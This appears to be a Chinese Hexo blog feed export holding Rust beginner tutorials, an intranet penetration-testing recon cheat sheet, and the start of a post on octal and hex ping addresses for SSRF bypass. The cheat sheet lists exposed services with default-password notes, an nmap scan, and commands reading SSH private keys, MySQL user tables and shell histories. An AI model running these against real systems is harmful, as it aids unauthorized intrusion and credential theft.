class="token function">parse</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">Ok</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> num<span class="token punctuation">,</span>    <span class="token function">Err</span><span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">continue</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h3 id="最终程序"><a href="#最终程序" class="headerlink" title="最终程序"></a>最终程序</h3><p>大功告成，把随机生成的输出关闭就好啦。</p><pre class=" language-rust"><code class="language-rust"><span class="token keyword">use</span> rand<span class="token punctuation">:</span><span class="token punctuation">:</span>Rng<span class="token punctuation">;</span><span class="token keyword">use</span> std<span class="token punctuation">:</span><span class="token punctuation">:</span>cmp<span class="token punctuation">:</span><span class="token punctuation">:</span>Ordering<span class="token punctuation">;</span><span class="token keyword">use</span> std<span class="token punctuation">:</span><span class="token punctuation">:</span>io<span class="token punctuation">;</span><span class="token keyword">fn</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">println!</span><span class="token punctuation">(</span><span class="token string">"Guess the number!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> secret_number <span class="token operator">=</span> rand<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">thread_rng</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">gen_range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">..</span><span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">loop</span> <span class="token punctuation">{</span>        <span class="token function">println!</span><span class="token punctuation">(</span><span class="token string">"Please input your guess."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> guess <span class="token operator">=</span> String<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        io<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">stdin</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">read_line</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> guess<span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">expect</span><span class="token punctuation">(</span><span class="token string">"Failed to read line"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> guess<span class="token punctuation">:</span> u32 <span class="token operator">=</span> <span class="token keyword">match</span> guess<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">Ok</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> num<span class="token punctuation">,</span>            <span class="token function">Err</span><span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">continue</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token function">println!</span><span class="token punctuation">(</span><span class="token string">"You guessed: {guess}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">match</span> guess<span class="token punctuation">.</span><span class="token function">cmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>secret_number<span class="token punctuation">)</span> <span class="token punctuation">{</span>            Ordering<span class="token punctuation">:</span><span class="token punctuation">:</span>Less <span class="token operator">=</span><span class="token operator">></span> <span class="token function">println!</span><span class="token punctuation">(</span><span class="token string">"Too small!"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            Ordering<span class="token punctuation">:</span><span class="token punctuation">:</span>Greater <span class="token operator">=</span><span class="token operator">></span> <span class="token function">println!</span><span class="token punctuation">(</span><span class="token string">"Too big!"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            Ordering<span class="token punctuation">:</span><span class="token punctuation">:</span>Equal <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                <span class="token function">println!</span><span class="token punctuation">(</span><span class="token string">"You win!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>当当当当</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20220730190300805.png"></p><p>我一下就猜中了，厉害不</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20220730190345458.png"></p><p>下面要开始学习基础了。</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Rust </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rust </tag>
            
            <tag> Game </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rust programming 2</title>
      <link href="posts/1eab.html"/>
      <url>posts/1eab.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>基础永远值得花费90%的精力去学习加强。认识实践的重要性。</p></blockquote><h2 id="Ax-Rust-Hello-World"><a href="#Ax-Rust-Hello-World" class="headerlink" title="Ax Rust Hello World"></a>Ax Rust Hello World</h2><p>第一个程序<code>main.rs</code></p><pre class=" language-rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">println!</span><span class="token punctuation">(</span><span class="token string">"Hello, world!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>执行</p><pre class=" language-shell"><code class="language-shell">$ rustc main.rs    # 编译                                                                        $ ./main            # 执行Hello, world!</code></pre><h2 id="Bx-Cargo"><a href="#Bx-Cargo" class="headerlink" title="Bx Cargo"></a>Bx Cargo</h2><p>Cargo 是 Rust 的构建系统和包管理器。</p><h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><pre class=" language-shell"><code class="language-shell">$ cargo new hello_cargo</code></pre><p>进入<em>hello_cargo</em>目录并列出文件。您会看到 Cargo 为我们生成了两个文件和一个目录：一个<em>Cargo.toml</em>文件和一个 <em>src</em>目录，其中包含一个<em>main.rs</em>文件。</p><p>它还初始化了一个新的 Git 存储库以及一个*.gitignore*文件。<code>cargo new</code>如果您在现有的 Git 存储库中运行，则不会生成 Git 文件；您可以使用<code>cargo new --vcs=git</code>.</p><h4 id="Cargo-toml"><a href="#Cargo-toml" class="headerlink" title="Cargo.toml"></a>Cargo.toml</h4><p>文件名：Cargo.toml</p><pre class=" language-toml"><code class="language-toml">[package]name = "hello_cargo"version = "0.1.0"edition = "2021"# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html[dependencies]</code></pre><p>该文件采用<a href="https://toml.io/"><em>TOML</em></a>（<em>Tom’s Obvious, Minimal Language</em>）格式，这是 Cargo 的配置格式。</p><p>[package] ：第一行是节标题。指示以下语句正在配置包。</p><p>接下来的三行设置 Cargo 编译程序所需的配置信息：名称、版本和要使用的 Rust 版本。</p><p>最后一行，<code>[dependencies]</code>，是您列出项目的任何依赖项的部分的开始。在 Rust 中，代码包被称为 <em>crates</em>。这个项目我们不需要任何其他 crate，但我们将在第 2 章的第一个项目中使用，因此我们将使用这个依赖项部分。</p><h4 id="main-rs"><a href="#main-rs" class="headerlink" title="main.rs"></a>main.rs</h4><p>文件名：src/main.rs</p><pre class=" language-rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">println!</span><span class="token punctuation">(</span><span class="token string">"Hello, world!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>Cargo 生成了一个“Hello, world!” 为您准备的程序。</p><p>我们之前的项目与 Cargo 生成的项目的不同之处在于 Cargo 将代码放在了<em>src</em> 目录中，而我们在顶层目录中有一个<em>Cargo.toml</em>配置文件。</p><blockquote><p>思想：Cargo 希望您的源文件位于<em>src</em>目录中。顶级项目目录仅用于 README 文件、许可证信息、配置文件以及与您的代码无关的任何其他内容。使用 Cargo 可以帮助您组织项目。一切都有一个地方，一切都在它的位置。</p></blockquote><p>如果您启动了一个不使用 Cargo 的项目，就像我们使用“Hello, world!”所做的那样 项目，您可以将其转换为使用 Cargo 的项目。将项目代码移动到<em>src</em>目录并创建一个适当的<em>Cargo.toml</em> 文件。    </p><h3 id="构建和运行"><a href="#构建和运行" class="headerlink" title="构建和运行"></a>构建和运行</h3><h4 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h4><p>在<em>hello_cargo</em>目录中，通过输入以下命令构建项目：</p><pre class=" language-shell"><code class="language-shell">$ cargo build   Compiling hello_cargo v0.1.0 (file:///projects/hello_cargo)    Finished dev [unoptimized + debuginfo] target(s) in 2.85 secs</code></pre><h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><p>此命令在target/debug/hello_cargo（或 Windows 上的<em>target\debug\hello_cargo.exe</em>）而不是在您的当前目录中创建一个可执行文件。您可以使用以下命令运行可执行文件：</p><pre class=" language-shell"><code class="language-shell">$ ./target/debug/hello_cargo # or .\target\debug\hello_cargo.exe on WindowsHello, world!</code></pre><p>第一次运行<code>cargo build</code>也会导致 Cargo 在顶层创建一个新文件：<em>Cargo.lock</em>。该文件跟踪项目中依赖项的确切版本。这个项目没有依赖，所以文件有点稀疏。<strong>您永远不需要手动更改此文件</strong>；Cargo 为您管理其内容。</p><p>我们刚刚构建了一个项目<code>cargo build</code>并使用 运行它 <code>./target/debug/hello_cargo</code>，但我们也可以使用它<code>cargo run</code>来编译代码，然后在一个命令中运行生成的可执行文件</p><pre class=" language-shell"><code class="language-shell">$ cargo run    Finished dev [unoptimized + debuginfo] target(s) in 0.0 secs     Running `target/debug/hello_cargo`Hello, world!</code></pre><h4 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h4><p>Cargo 还提供了一个名为<code>cargo check</code>. 此命令快速检查您的代码以确保它可以编译但不会生成可执行文件：</p><pre class=" language-shell"><code class="language-shell">$ cargo check   Checking hello_cargo v0.1.0 (file:///projects/hello_cargo)    Finished dev [unoptimized + debuginfo] target(s) in 0.32 secs</code></pre><p>为什么你不想要一个可执行文件？通常，<code>cargo check</code>比  <code>cargo build</code>快得多，因为它跳过了生成可执行文件的步骤。如果您在编写代码时不断检查您的工作，使用<code>cargo check</code>将加快该过程！因此，许多 Rustaceans 在<code>cargo check</code>编写程序时会定期运行以确保它可以编译。然后它们<code>cargo build</code>在准备好使用可执行文件时运行。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>cargo总结：</p><ul><li>我们可以使用<code>cargo new</code>.</li><li>我们可以使用<code>cargo build</code>.</li><li>我们可以使用<code>cargo run</code>.</li><li>我们可以在不生成二进制文件的情况下构建一个项目来使用 <code>cargo check</code>.</li><li>Cargo 没有将构建结果保存在与我们的代码相同的目录中，而是将其存储在<em>target/debug</em>目录中。</li></ul><h4 id="发布"><a href="#发布" class="headerlink" title="发布"></a>发布</h4><p>当您的项目最终准备好发布时，您可以使用<code>cargo build --release</code>优化来编译它。<em>此命令将在target/release</em>而不是<em>target/debug</em>中创建可执行文件。</p><p>优化使您的 Rust 代码运行得更快，但打开它们会延长程序编译所需的时间。这就是为什么有两种不同的配置文件的原因：一个用于开发，当您想要快速且经常重建时，另一个用于构建您将提供给用户的最终程序，该程序不会重复重建并且运行速度与可能的</p><p>如果您要对代码的运行时间进行基准测试，请务必使用<em>target/release</em><code>cargo build --release</code>中的可执行文件运行和基准测试。</p><h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><p>使用git快速下载公开项目到本地，并构建。</p><pre class=" language-shell"><code class="language-shell">$ git clone example.org/someproject$ cd someproject$ cargo build</code></pre><h2 id="Cx-Conclusion"><a href="#Cx-Conclusion" class="headerlink" title="Cx Conclusion"></a>Cx Conclusion</h2><p>您的 Rust 之旅已经有了一个良好的开端！在本章中，您学习了如何：</p><ul><li>使用安装最新稳定版本的 Rust<code>rustup</code></li><li>更新到较新的 Rust 版本</li><li>打开本地安装的文档</li><li>编写并运行“你好，世界！” 程序<code>rustc</code>直接使用</li><li>使用 Cargo 的约定创建并运行一个新项目</li></ul><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Rust </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rust </tag>
            
            <tag> Cargo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rust programming 1</title>
      <link href="posts/1feb.html"/>
      <url>posts/1feb.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>基础永远值得花费90%的精力去学习加强。认识实践的重要性。</p></blockquote><h2 id="Ax-Rust-Introduction"><a href="#Ax-Rust-Introduction" class="headerlink" title="Ax Rust Introduction"></a>Ax Rust Introduction</h2><p>Rust是一种多范式、通用的编程语言。Rust 强调性能、类型安全和并发性。软件开发人员 Graydon Hoare 于 2006 年在Mozilla Research工作时设计了 Rust 。 Mozilla 于 2009 年正式赞助了该项目，自 2014 年 1 月发布第一个稳定版本以来，Rust 已应用于亚马逊、Discord、Dropbox、Facebook ( Meta )、谷歌( Alphabet ) 和微软。</p><p><img src="https://lit.enomothem.com/zhixinghe/image-20230202085144662.png"></p><p>Rust 源于Mozilla员工 Graydon Hoare 于 2006 年开始的个人项目。Mozilla 于 2009 年开始赞助该项目，并于 2010 年正式宣布该项目。</p><p>编译器的第一个编号的 pre-alpha 版本，Rust 0.1，于 2012 年 1 月发布。</p><p>Rust 的类型系统在 Rust 0.2、0.3 和 0.4 版本之间发生了很大变化。0.2 版首次引入了类和 0.3 版通过使用接口添加了析构函数和多态性。在 Rust 0.4 中，添加了特征作为一种手段provide 继承；接口与特征统一，并作为单独的功能被删除。类也被删除并被实现和结构化类型的组合所取代。除了传统的静态类型，在 0.4 版本之前，Rust 还支持通过契约进行类型状态分析。它在 0.4 版中被删除，尽管可以通过利用 Rust 的类型系统来实现相同的功能。</p><p>2014 年 1 月，Dr. Dobb’s Journal的主编Andrew Binstock 评论了 Rust 有可能成为C++除了语言D、Go和Nim（然后是 Nimrod）之外的竞争对手</p><p>2020 年 8 月，Mozilla 在全球 1,000 名员工中裁减了 250 名，这是由于COVID-19 大流行的长期影响而导致的公司重组的一部分。用 Rust 编写的浏览器引擎Servo背后的团队完全解散了。该事件引发了对 Rust 未来的担忧，因为团队中的一些成员是 Rust 的积极贡献者。在接下来的一周，Rust 核心团队承认裁员的严重影响，并宣布正在制定 Rust 基金会的计划。该基金会的首要目标是拥有所有商标和域名，并为其成本承担财务责任。</p><p>2021 年 2 月 8 日，Rust 基金会由其五家创始公司（AWS、华为、谷歌、微软和Mozilla）宣布成立。在 2021 年 4 月 6 日发布的博客文章中，谷歌宣布在Android 开源项目中支持 Rust作为 C/C++ 的替代方案。</p><p>根据2022 年Stack Overflow开发者调查，9% 的受访者最近在 Rust 中进行了广泛的开发。 2022 年，Rust 与Python并列成为“最受欢迎的技术”，18% 目前未在 Rust 工作的开发人员表示有兴趣这样做。</p><p>这并不总是那么清楚，但是Rust编程语言从根本上讲是关于授权的:无论您现在正在编写什么样的代码，Rust都能使您走得更远，能够比您以前更有信心地在更广泛的领域进行编程。</p><p>例如，处理内存管理、数据表示和并发性的底层细节的“系统级”工作。传统上，这种编程领域被认为是神秘的，只有少数人能够接触到，他们花了必要的时间来学习避免它的臭名昭著的陷阱。即使是那些使用它的人也要谨慎行事，以免他们的代码被利用、崩溃或腐败。</p><p>Rust通过消除旧的陷阱并提供一套友好的、精心打磨的工具来帮助您，从而打破了这些障碍。需要“深入”到较低级别的控制的程序员可以使用Rust这样做，而不需要承担崩溃或安全漏洞的习惯风险，也不需要学习变化的工具链的细微之处。更好的是，该语言被设计为自然地引导您编写在速度和内存使用方面高效的可靠代码。</p><p>已经在处理低级代码的程序员可以使用Rust来提高他们的野心。例如，在Rust中引入并行性是一个风险相对较低的操作:编译器将为您捕获经典的错误。您可以在代码中处理更积极的优化，并且有信心不会意外地引入崩溃或漏洞。</p><p>但是Rust并不局限于低级的系统编程。它的表现力和人体工程学足以使CLI应用程序、web服务器和许多其他类型的代码编写起来相当愉快—您将在本书后面找到两者的简单示例。使用Rust可以让你建立从一个领域转移到另一个领域的技能;你可以通过编写一个web应用程序来学习Rust，然后将这些技能应用到你的树莓派上。</p><p>这本书充分展示了Rust增强用户能力的潜力。这是一个友好和平易近人的文本，旨在帮助您不仅提高您对Rust的知识，而且还提高您作为一个程序员的接触范围和信心。所以，开始吧，准备好学习吧——欢迎来到Rust社区!</p><p>——Nicholas Matsakis和Aaron Turon</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Rust </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rust </tag>
            
            <tag> Intro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透-信息收集</title>
      <link href="posts/4782.html"/>
      <url>posts/4782.html</url>
      
        <content type="html"><![CDATA[<h2 id="Ax-内网信息收集"><a href="#Ax-内网信息收集" class="headerlink" title="Ax 内网信息收集"></a>Ax 内网信息收集</h2><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><h4 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h4><p>21 ftp 主要看是否支持匿名，也可以跑弱口令<br>80 web 常见web漏洞以及是否为一些管理后台<br>443 openssl 心脏滴血以及一些web漏洞测试<br>873 rsync 主要看是否支持匿名，也可以跑弱口令<br>2601,2604 zebra路由，默认密码zebra<br>3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了<br>4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网</p><p>5900 vnc<br>6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网<br>6379 redis 一般无认证，可直接访问</p><p>7001的weblogic，默认弱口令，8080的tomcat，默认弱口令</p><p>8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上<br>9200 elasticsearch<br>11211 memcache 未授权访问<br>27017 mongodb 未授权访问<br>28017 mongodb统计页面</p><p>50000端口SAP命令执行</p><p>2222 DA虚拟主机管理系统登陆 （国外用较多）<br>2082/2083 cpanel主机管理系统登陆 （国外用较多）<br>3312/3311 kangle主机管理系统登陆<br>8083 Vestacp主机管理系统 （国外用较多）<br>7778 Kloxo主机控制面板登录<br>10000 Virtualmin/Webmin 服务器虚拟主机管理系统</p><p>附上自己平时用的nmap命令，由于之前发包太大vps被封过一次，所以加了一些限速的参数<br>./nmap -sT -sV -p 21,80,443,873,2601,2604,3128,4440,6082,6379,8000,8008,8080,8081,8090,8099,8088,8888,9000,9090,9200,11211,27017,28017 –max-hostgroup 10 –max-parallelism 10 –max-rtt-timeout 1000ms –host-timeout 800s –max-scan-delay 2000ms -iL iplist.txt -oN result/port.txt –open</p><h4 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h4><p>cat /etc/issue<br>cat /etc/*-release<br>cat /etc/lsb-release<br>cat /etc/redhat-release</p><h4 id="内核"><a href="#内核" class="headerlink" title="内核"></a>内核</h4><p>cat /proc/version<br>uname -a<br>uname -mrs<br>rpm -q kernel<br>dmesg | grep Linux<br>ls /boot | grep vmlinuz</p><h4 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h4><p>ps aux<br>ps -ef<br>top<br>cat /etc/service</p><h4 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h4><p>ls -alh /usr/bin/<br>ls -alh /sbin/<br>dpkg -l<br>rpm -qa<br>ls -alh /var/cache/apt/archivesO<br>ls -alh /var/cache/yum/</p><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>cat /etc/syslog.conf<br>cat /etc/chttp.conf<br>cat /etc/lighttpd.conf<br>cat /etc/cups/cupsd.conf<br>cat /etc/inetd.conf<br>cat /etc/apache2/apache2.conf<br>cat /etc/my.conf<br>cat /etc/httpd/conf/httpd.conf<br>cat /opt/lampp/etc/httpd.conf<br>ls -aRl /etc/ | awk ‘$1 ~ /^.<em>r.</em>/<br>cat /var/apache2/config.inc<br>cat /var/lib/mysql/mysql/user.MYD<br>cat /root/anaconda-ks.cfg</p><p>cat ~/.bash_history</p><p>cat ~/.nano_history</p><p>cat ~/.atftp_history</p><p>cat ~/.mysql_history </p><p>cat ~/.php_history</p><p>cat ~/.bashrc</p><p>cat ~/.profile</p><p>cat /var/mail/root</p><p>cat /var/spool/mail/root</p><p>cat ~/.ssh/authorized_keys</p><p>cat ~/.ssh/identity.pub</p><p>cat ~/.ssh/identity</p><p>cat ~/.ssh/id_rsa.pub</p><p>cat ~/.ssh/id_rsa</p><p>cat ~/.ssh/id_dsa.pub</p><p>cat ~/.ssh/id_dsa</p><p>cat /etc/ssh/ssh_config</p><p>cat /etc/ssh/sshd_config</p><p>cat /etc/ssh/ssh_host_dsa_key.pub</p><p>cat /etc/ssh/ssh_host_dsa_key</p><p>cat /etc/ssh/ssh_host_rsa_key.pub</p><p>cat /etc/ssh/ssh_host_rsa_key</p><p>cat /etc/ssh/ssh_host_key.pub</p><p>cat /etc/ssh/ssh_host_key</p><p>ls -alh /var/log</p><p>ls -alh /var/mail</p><p>ls -alh /var/spool</p><p>ls -alh /var/spool/lpd </p><p>ls -alh /var/lib/pgsql</p><p>ls -alh /var/lib/mysql</p><p>cat /var/lib/dhcp3/dhclient.leases</p><p>ls -alhR /var/www/</p><p>ls -alhR /srv/www/htdocs/</p><p>ls -alhR /usr/local/www/apache22/data/</p><p>ls -alhR /opt/lampp/htdocs/</p><p>ls -alhR /var/www/html/</p><h4 id="计划"><a href="#计划" class="headerlink" title="计划"></a>计划</h4><p>crontab -l<br>ls -alh /var/spool/cron<br>ls -al /etc/ | grep cron<br>ls -al /etc/cron*<br>cat /etc/cron*<br>cat /etc/at.allow<br>cat /etc/at.deny<br>cat /etc/cron.allow<br>cat /etc/cron.deny<br>cat /etc/crontab<br>cat /etc/anacrontab<br>cat /var/spool/cron/crontabs/root</p><h4 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h4><p>arp -e<br>route<br>/sbin/route -nee<br>cat /etc/resolv.conf<br>cat /etc/sysconfig/network<br>cat /etc/networks<br>iptables -L<br>hostname<br>dnsdomainname</p><h4 id="通讯"><a href="#通讯" class="headerlink" title="通讯"></a>通讯</h4><p>lsof -i</p><p>lsof -i :80</p><p>grep 80 /etc/services</p><p>netstat -antup</p><p>netstat -antpx</p><p>netstat -tulpn</p><p>chkconfig –list</p><p>chkconfig –list | grep 3:on</p><p>last</p><p>w</p><h4 id="流量"><a href="#流量" class="headerlink" title="流量"></a>流量</h4><p># tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]</p><p>tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21</p><h4 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h4><p>cat /etc/httpd/logs/access_log</p><p>cat /etc/httpd/logs/access.log</p><p>cat /etc/httpd/logs/error_log</p><p>cat /etc/httpd/logs/error.log</p><p>cat /var/log/apache2/access_log</p><p>cat /var/log/apache2/access.log</p><p>cat /var/log/apache2/error_log</p><p>cat /var/log/apache2/error.log</p><p>cat /var/log/apache/access_log</p><p>cat /var/log/apache/access.log</p><p>cat /var/log/auth.log</p><p>cat /var/log/chttp.log</p><p>cat /var/log/cups/error_log</p><p>cat /var/log/dpkg.log</p><p>cat /var/log/faillog</p><p>cat /var/log/httpd/access_log</p><p>cat /var/log/httpd/access.log</p><p>cat /var/log/httpd/error_log</p><p>cat /var/log/httpd/error.log</p><p>cat /var/log/lastlog</p><p>cat /var/log/lighttpd/access.log</p><p>cat /var/log/lighttpd/error.log</p><p>cat /var/log/lighttpd/lighttpd.access.log</p><p>cat /var/log/lighttpd/lighttpd.error.log</p><p>cat /var/log/messages</p><p>cat /var/log/secure</p><p>cat /var/log/syslog</p><p>cat /var/log/wtmp</p><p>cat /var/log/xferlog</p><p>cat /var/log/yum.log</p><p>cat /var/run/utmp</p><p>cat /var/webmin/miniserv.log</p><p>cat /var/www/logs/access_log</p><p>cat /var/www/logs/access.log</p><p>ls -alh /var/lib/dhcp3/</p><p>ls -alh /var/log/postgresql/</p><p>ls -alh /var/log/proftpd/</p><p>ls -alh /var/log/samba/</p><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>find / -name perl*</p><p>find / -name python*</p><p>find / -name gcc*</p><p>find / -name cc</p><p>find / -name wget</p><p>find / -name nc*</p><p>find / -name netcat*</p><p>find / -name tftp*</p><p>find / -name ftp</p><h2 id="Ex-参考"><a href="#Ex-参考" class="headerlink" title="Ex 参考"></a>Ex 参考</h2><ul><li><a href="http://struts.apache.org/docs/s2-045.html">http://struts.apache.org/docs/s2-045.html</a></li><li><a href="https://blog.csdn.net/u011721501/article/details/60768657">https://blog.csdn.net/u011721501/article/details/60768657</a></li><li><a href="https://paper.seebug.org/247/">https://paper.seebug.org/247/</a></li><li><a href="https://github.com/vulhub/vulhub/blob/master/struts2/s2-045/">https://github.com/vulhub/vulhub/blob/master/struts2/s2-045/</a></li><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-045">https://cwiki.apache.org/confluence/display/WW/S2-045</a></li></ul><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实现Ping二进制八进制十六进制</title>
      <link href="posts/80bb.html"/>
      <url>posts/80bb.html</url>
      
        <content type="html"><![CDATA[<h2 id="Ax-Ping-Command"><a href="#Ax-Ping-Command" class="headerlink" title="Ax Ping Command"></a>Ax Ping Command</h2><blockquote><p>ping是我们最熟悉的命令，但在学习ssrf漏洞时，学到了通过ping八进制来绕过，惊讶到我了，就此分享一下。</p></blockquote><p><strong>ICMP</strong>(<strong>I</strong>nternet <strong>C</strong>ontrol <strong>M</strong>essage <strong>P</strong>rotocol)协议是因特网控制报文协议，因特网控制报文协议ICMP（Internet Control Message Protocol）是一个差错报告机制，是TCP/IP协议簇中的一个重要子协议，通常被IP层或更高层协议（TCP或UDP）使用，属于网络层协议，主要用于在IP主机和路由器之间传递控制消息，用于报告主机是否可达、路由是否可用等。这些控制消息虽然并不传输用户数据，但是对于收集各种网络信息、诊断和排除各种网络故障以及用户数据的传递具有至关重要的作用。</p><p>阅读文献：<a href="https://www.rfc-editor.org/rfc/rfc777.txt">RFC2616</a></p><h3 id="ICMP的应用"><a href="#ICMP的应用" class="headerlink" title="ICMP的应用"></a>ICMP的应用</h3><h4 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h4><blockquote><p>今天的主角，我们主要讲这个！</p></blockquote><p>Ping程序是最常见的用于检测IPv4和IPv6网络设备是否可达的调试手段，它使用ICMP的echo信息来确定：</p><ul><li>远程设备是否可达；</li><li>与远程主机通信的来回旅程（round-trip）的延迟；</li><li>报文包的丢失情况。</li></ul><h4 id="Tracert"><a href="#Tracert" class="headerlink" 